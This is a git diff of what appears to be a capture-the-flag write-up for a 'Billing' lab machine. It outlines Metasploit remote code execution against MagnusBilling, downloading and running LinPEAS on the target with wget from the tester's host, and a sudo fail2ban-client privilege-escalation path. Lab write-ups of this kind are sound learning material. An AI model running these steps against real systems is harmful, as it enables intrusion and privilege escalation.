@@ -26,7 +26,7 @@ dirsearch:
 
 - MagnusBilling - found by going to HTML source code (ctrl + U)
 
-## Exploit (msfconsole - Remote Code Execution)
+## Remote Code Execution using Metasploit
 - In msfconsole searched for MagnusBilling 
 ![image](https://github.com/user-attachments/assets/68f4782c-c1eb-4e5d-b169-ccba7dd631e7)
 - set RHOST and LHOST and then ran the command
@@ -42,9 +42,17 @@ uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
 
 
 1). ``` python3 -m http.server 8000 ``` (opened new tab in the terminal and ran this command in LinPEAS directory)
+
+
 2). On the target machine I ran those 3 commands: ``` wget http://10.6.41.41:8000/linpeas.sh -O /tmp/linpeas.sh ```
+
+
 3). ``` chmod +x /tmp/linpeas.sh ```
+
+
 4). ``` /tmp/linpeas.sh ```
+
+
 5). results found:
 ```
 Runas and Command-specific defaults for asterisk:
@@ -56,7 +64,8 @@ User asterisk may run the following commands on Billing:
 > indicating that you can run fail2ban-client without a password
 
 
-fff
+## Exploit
+Found an exploit i can use for fail2ban-client - https://vulners.com/packetstorm/PACKETSTORM:189989
 
 
 ![image](https://github.com/user-attachments/assets/ccf1934f-1b38-49a2-9288-182c3b35fc81)
